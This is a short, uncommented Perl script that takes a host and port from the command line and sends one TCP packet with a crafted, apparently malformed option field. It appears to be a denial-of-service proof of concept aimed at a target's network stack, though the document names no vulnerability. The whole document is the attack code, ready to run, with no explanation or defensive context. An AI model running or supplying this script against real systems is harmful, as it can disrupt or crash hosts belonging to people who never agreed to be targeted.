#!/usr/bin/perl
my $host =      shift;
my $port =      shift;

use             Net::Packet qw($Env);
use             Net::Packet::IPv4;
my $ip =        Net::Packet::IPv4->new(dst => $host);
use             Net::Packet::TCP;

my $tcp =       Net::Packet::TCP->new(
                    dst         => $port,
                    options     =>  "\x65\x02\x01\x01",
                );
use             Net::Packet::Frame;
my $frame =     Net::Packet::Frame->new(l3 => $ip, l4 => $tcp);
$frame->send;

